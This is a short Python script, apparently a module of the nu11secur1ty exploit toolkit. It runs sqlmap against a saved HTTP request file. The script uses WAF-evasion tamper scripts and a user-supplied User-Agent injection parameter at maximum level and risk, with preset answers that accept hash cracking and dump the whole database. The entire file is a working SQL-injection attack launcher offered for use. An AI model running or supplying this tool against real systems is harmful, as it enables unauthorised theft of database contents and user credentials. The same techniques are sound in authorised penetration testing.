#!/usr/bin/python
# nu11secur1ty 2023-2024

import time
import os
import shlex
import sys
from colorama import init, Fore, Style

init(convert=True)

try:
    print("The PoC process will continue...\n")
    time.sleep(1)

    print(Fore.GREEN + "Put your special parameter for User-Agent, or press Enter to return to the menu...\n" + Style.RESET_ALL)
    user_agent = input(Fore.RED + "> " + Style.RESET_ALL).strip()

    if not user_agent:
        print(Fore.YELLOW + "No User-Agent provided. Returning to menu.\n" + Style.RESET_ALL)
        sys.exit(0)

    # Dynamically determine base directory (parent of modules)
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    exploit_path = os.path.join(base_dir, 'exploit.txt')

    if not os.path.isfile(exploit_path):
        print(Fore.RED + f"❌ Exploit file not found at '{exploit_path}'. Please generate it first." + Style.RESET_ALL)
        sys.exit(1)

    sqlmap_path = r'D:\CVE\sqlmap-nu11secur1ty\sqlmap.py'  # Adjust if needed

    # Quote user_agent for safe shell usage
    safe_user_agent = shlex.quote(user_agent)

    cmd = (
        f'python "{sqlmap_path}" -r "{exploit_path}" --tamper="space2comment,apostrophemask,bypass" '
        '--no-cast --no-escape ' 
        f'--user-agent={safe_user_agent} --dbms=mysql --time-sec=7 --random-agent '
        f'--level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump'
    )

    os.system(cmd)
    print(Fore.RED + "Happy hunting with nu11secur1ty =)" + Style.RESET_ALL)

except KeyboardInterrupt:
    print(f"\n{Fore.YELLOW}[!] Interrupted by user. Exiting cleanly...{Style.RESET_ALL}")
    sys.exit(0)
